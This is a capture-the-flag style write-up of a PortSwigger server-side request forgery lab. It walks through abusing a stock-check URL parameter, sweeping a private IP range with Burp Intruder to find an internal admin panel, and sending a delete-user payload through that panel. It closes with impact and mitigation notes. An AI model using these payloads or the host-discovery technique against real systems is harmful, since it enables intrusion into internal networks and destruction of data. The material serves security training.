# Basic SSRF Against Another Back-End System

## 📌 Lab Overview

This lab demonstrates a **Server-Side Request Forgery (SSRF)** vulnerability against an internal back-end system.

Unlike the previous SSRF lab where the vulnerable server could access its own localhost interface, this lab required discovering another internal system located within the organization's private network.

The vulnerability existed because:

- user-controlled URLs were used by the backend server
- internal network resources were reachable from the application server
- the application performed no validation on destination hosts
- attackers could force the server to make requests to internal IP addresses

This lab focused on:

- Server-Side Request Forgery (SSRF)
- Internal Network Enumeration
- Internal Host Discovery
- Administrative Interface Access
- Burp Intruder Automation

---

# 🔍 What is SSRF?

**Server-Side Request Forgery (SSRF)** occurs when an attacker can manipulate a server into making HTTP requests to unintended destinations.

Normally:

```text
User
 ↓
Web Application
 ↓
Stock API
```

The application decides where requests should be sent.

With SSRF:

```text
Attacker
 ↓
Web Application
 ↓
Internal Systems
```

The attacker controls the destination and can force the server to access:

```text
localhost
internal APIs
admin panels
private network hosts
cloud metadata services
```

Because the requests originate from a trusted internal server, security controls often allow them.

---

# ⚠ Why Was the Application Vulnerable?

The stock-checking functionality accepted a URL parameter:

```text
stockApi=<URL>
```

The backend server used this URL directly when retrieving stock information.

Since no validation existed, an attacker could replace the legitimate API endpoint with any destination they wanted.

This allowed requests to be redirected toward internal network systems.

---

# 🎯 Objective

The goal of this lab was to:

- identify the SSRF entry point
- discover the internal administration server
- access the admin panel
- locate the delete functionality
- delete the Carlos user
- solve the lab

---

# 🖼 Step-by-Step Walkthrough

## Screenshot 1 — Normal Webpage

![Screenshot 1]()

The application initially displayed:

- several products
- a **View Details** button for each product

At this stage no vulnerability was visible from the user interface.

---

## Screenshot 2 — Product Details Page

![Screenshot 2](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(2).png?raw=true)

After clicking a product's **View Details** button, I was redirected to the product page.

The page contained a:

```text
Check Stock
```

button.

After clicking it, the application returned:

```text
943 units
```

This suggested that stock information was being retrieved dynamically from another service.

---

## Screenshot 3 — Identifying the SSRF Entry Point

![Screenshot 3](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(3).png?raw=true)

I captured the stock-checking request:

```http
POST /product/stock
```

The request contained the following parameter:

```text
stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1
```

This revealed that the backend server was making requests to an internal IP address.

The SSRF attack surface became:

```text
stockApi=
```

because the server trusted whatever URL was supplied.

---

## Screenshot 4 — Enumerating the Internal Network

![Screenshot 4](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(4).png?raw=true)

The lab hinted that an administrative interface existed somewhere within the:

```text
192.168.0.X
```

network.

I modified the request to:

```text
stockApi=http://192.168.0.§X§:8080/admin
```

and sent it to Burp Intruder.

Payload Configuration:

```text
Payload Type: Numbers
Range: 1 → 254
```

### Why Brute Force the Last Octet?

Private networks commonly use ranges such as:

```text
192.168.0.0/24
```

which contains:

```text
192.168.0.1
192.168.0.2
192.168.0.3
...
192.168.0.254
```

The administrative server could be hosted on any IP within that network.

By brute-forcing:

```text
192.168.0.X
```

we are effectively performing:

```text
Internal Host Discovery
```

to identify which machine contains the admin panel.

---

## Screenshot 5 — Finding the Internal Admin Server

![Screenshot 5](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(5).png?raw=true)

After launching the Intruder attack, I reviewed the responses.

One request returned:

```http
200 OK
```

while the others returned error responses.

The successful response corresponded to:

```text
192.168.0.18
```

indicating that the admin interface was hosted on:

```text
http://192.168.0.18:8080/admin
```

---

## Screenshot 6 — Accessing the Admin Panel

![Screenshot 6](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(6).png?raw=true)

After selecting the successful response and rendering it, I gained access to the internal admin panel.

The page displayed:

```text
wiener
carlos
```

along with administrative actions.

This confirmed that SSRF successfully exposed an internal management interface.

---

## Screenshot 7 — Discovering the Delete Endpoint

![Screenshot 7](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(7).png?raw=true)

While reviewing the response in the Pretty tab, I located the delete functionality:

```html
<a href="/admin/delete?username=carlos">
```

The endpoint responsible for deleting Carlos was:

```text
http://192.168.0.18:8080/admin/delete?username=carlos
```

I copied the URL for the next step.

---

## Screenshot 8 — Deleting Carlos

![Screenshot 8](https://github.com/varun-kumar-sec/portswigger-labs-writeups/blob/main/ssrf/Basic%20SSRF%20Against%20Another%20Back-End%20System/screenshots/lab2(8).png?raw=true)

I modified the SSRF parameter to:

```text
stockApi=http://192.168.0.18:8080/admin/delete?username=carlos
```

and sent the request.

The backend server performed the request internally.

As a result:

```text
Carlos Account Deleted
```

and the lab was successfully solved.

---

# ⚠ Why This Vulnerability Exists

The vulnerability existed because the application trusted user-controlled URLs and used them directly when making backend requests.

The workflow looked like:

```text
User Input
        ↓
stockApi Parameter
        ↓
Backend Request
        ↓
Internal Network Access
```

Since there were no restrictions on destination hosts, attackers could access internal systems that should never be exposed externally.

---

# 💥 Impact

An attacker could potentially:

- discover internal hosts
- enumerate internal services
- access hidden admin interfaces
- interact with internal APIs
- bypass firewall restrictions
- delete or modify sensitive data
- compromise internal infrastructure

---

# 🛡 Mitigation

To prevent SSRF vulnerabilities:

- validate all user-supplied URLs
- use strict allowlists
- block requests to private IP ranges
- block localhost access
- isolate internal services
- implement outbound network filtering
- restrict backend connectivity

Example blocked ranges:

```text
127.0.0.1
localhost
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

---

# 🧠 Skills Learned

- Server-Side Request Forgery (SSRF)
- Internal Network Enumeration
- Host Discovery
- Burp Intruder Automation
- Internal Admin Panel Discovery
- Private IP Address Analysis
- Backend Request Manipulation

---

# 🧰 Tools Used

- Burp Suite
- Burp Repeater
- Burp Intruder
- PortSwigger Web Security Academy

---

# ✅ Conclusion

This lab demonstrated how SSRF vulnerabilities can be leveraged to access systems located on an organization's internal network.

By identifying the SSRF entry point, brute-forcing internal IP addresses within the private network range, discovering the hidden administration server, and abusing administrative functionality, I was able to delete the Carlos user account.

Through this lab, I learned:

- how SSRF can expose internal infrastructure
- how internal network enumeration works
- how to discover hidden backend systems
- how Burp Intruder can automate host discovery
- how administrative interfaces can become exposed through SSRF

The lab was successfully solved by exploiting a Server-Side Request Forgery vulnerability to locate the internal administration server and delete the Carlos account.
